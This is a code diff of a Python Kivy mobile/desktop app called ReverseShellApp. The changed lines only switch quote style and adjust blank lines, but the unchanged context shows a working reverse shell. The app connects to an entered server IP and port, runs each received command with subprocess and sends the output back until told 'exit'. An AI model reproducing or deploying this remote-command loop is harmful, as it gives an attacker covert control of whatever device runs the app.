@@ -10,12 +10,12 @@ from kivy.uix.textinput import TextInput
 
 class ReverseShellApp(App):
     def build(self):
-        layout = BoxLayout(orientation='vertical')
+        layout = BoxLayout(orientation="vertical")
 
-        self.ip_input = TextInput(hint_text='Server IP', multiline=False)
-        self.port_input = TextInput(hint_text='Server Port', multiline=False)
-        connect_button = Button(text='Connect', on_press=self.connect_to_server)
-        self.status_label = Label(text='')
+        self.ip_input = TextInput(hint_text="Server IP", multiline=False)
+        self.port_input = TextInput(hint_text="Server Port", multiline=False)
+        connect_button = Button(text="Connect", on_press=self.connect_to_server)
+        self.status_label = Label(text="")
 
         layout.add_widget(self.ip_input)
         layout.add_widget(self.port_input)
@@ -31,11 +31,11 @@ class ReverseShellApp(App):
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             s.connect((server_ip, server_port))
-            self.status_label.text = 'Connected to server'
+            self.status_label.text = "Connected to server"
 
             while True:
                 command = s.recv(1024).decode()
-                if command.lower() == 'exit':
+                if command.lower() == "exit":
                     break
                 output = subprocess.getoutput(command)
                 s.send(output.encode())
@@ -44,5 +44,6 @@ class ReverseShellApp(App):
         except Exception as e:
             self.status_label.text = f"Error: {e}"
 
-if __name__ == '__main__':
+
+if __name__ == "__main__":
     ReverseShellApp().run()
